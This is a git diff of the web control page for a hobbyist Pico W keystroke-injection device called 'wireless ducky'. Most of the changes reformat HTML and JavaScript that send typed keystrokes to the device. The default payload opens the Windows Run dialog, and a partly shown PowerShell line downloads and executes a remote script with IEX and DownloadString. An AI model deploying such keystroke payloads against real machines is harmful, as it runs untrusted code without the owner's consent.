@@ -1,70 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>pico w</title>
-</head>
-<body>
-    <h1>wireless ducky!!</h1>
 
-    <div>
-        <h3>send keystrokes:</h3>
-        <textarea style="width: 800px; height: 300px;" type="text" id="keys-to-send"></textarea>
-        <br>
-        <button onclick="submit()">submit</button>
-        <p id="status">Note: reloading may result in payloads being sent again.</p>
-    </div>
-    <button onclick="terminate()">terminate server</button>
-    <div style="position: absolute; bottom: 0; left: 10px;">
-        <p style="font-size: 10px;">by TheSavageTeddy on <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW">github</a></p>
-    </div>
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>pico w</title>
+</head>
+
+<body>
+	<h1>wireless ducky!!</h1>
+	<div>
+		<h3>send keystrokes:</h3>
+		<textarea style="width: 800px; height: 300px;" type="text" id="keys-to-send"></textarea>
+		<br>
+		<button onclick="submit()">submit</button>
+	</div>
+	<button onclick="terminate()">terminate server</button>
+	<p>check the <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a> for usage info</p>
+	<div style="position: absolute; bottom: 0; left: 10px;">
+		<p style="font-size: 10px;">by TheSavageTeddy on <a href="https://github.com/TheSavageTeddy/wirelessRubberDuckyPicoW" target="_blank">github</a></p>
+	</div>
 </body>
 <script>
-    function ascii_to_hex(str){
-        var arr1 = [];
-        for (var n = 0, l = str.length; n < l; n ++) 
-        {
-            var hex = Number(str.charCodeAt(n)).toString(16);
-            arr1.push(hex);
-        }
-        return arr1.join('');
-    }
+function ascii_to_hex(str) {
+	var arr1 = [];
+	for(var n = 0, l = str.length; n < l; n++) {
+		var hex = Number(str.charCodeAt(n)).toString(16);
+		arr1.push(hex);
+	}
+	return arr1.join('');
+}
 
-    function setStatus(text){
-        document.getElementById("status").innerHTML = text
-    }
+function setStatus(text) {
+	document.getElementById("status").innerHTML = text
+}
 
-    function terminate(){
-        fetch('/terminate', {
-        method: 'POST',
-        headers: {
-            'Accept': '*/*',
-        },
-        })
-    }
+function terminate() {
+	confirm("Are you sure you want to terminate the server?") ? 
+	fetch('/terminate', {
+		method: 'POST',
+		headers: {
+			'Accept': '*/*',
+		},
+	}) : null
+}
 
-    function submit(){
-        let input = document.getElementById("keys-to-send").value
-        let to_send = []
-        let maxLength = 1300
-        input = input.split("\n")
-        input.forEach(e => {
-            if (e[0] === ">" && e.split(" ").length === 3){
-                tmp = e.split(" ")
-                to_send.push([tmp[1], tmp[2]])
-            }else{
-                to_send.push(e)
-            }
-        });
-
-        let data = ascii_to_hex(JSON.stringify({"keys":to_send}))
-        fetch(`/sendkeys?keys=${data}`, {method: 'GET'})
-    }
-
-    document.addEventListener("DOMContentLoaded", ()=>{
-        document.getElementById("keys-to-send").innerHTML = `> GUI DOWN
+function submit() {
+	let input = document.getElementById("keys-to-send").value
+	let to_send = []
+	let maxLength = 1300
+	input = input.split("\n")
+	input.forEach(e => {
+		if(e[0] === ">" && e.split(" ").length === 3) {
+			tmp = e.split(" ")
+			to_send.push([tmp[1], tmp[2]])
+		} else {
+			to_send.push(e)
+		}
+	});
+	let data = ascii_to_hex(JSON.stringify({
+		"keys": to_send
+	}))
+	fetch(`/sendkeys?keys=${data}`, {
+		method: 'GET'
+	})
+}
+document.addEventListener("DOMContentLoaded", () => {
+	// Default text
+	document.getElementById("keys-to-send").innerHTML = `> GUI DOWN
 > R DOWN
 > R UP
 > GUI UP
@@ -87,6 +91,7 @@ IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubuserconte
 > ENTER DOWN
 > ENTER UP
 `
-    })
+})
 </script>
+
 </html>
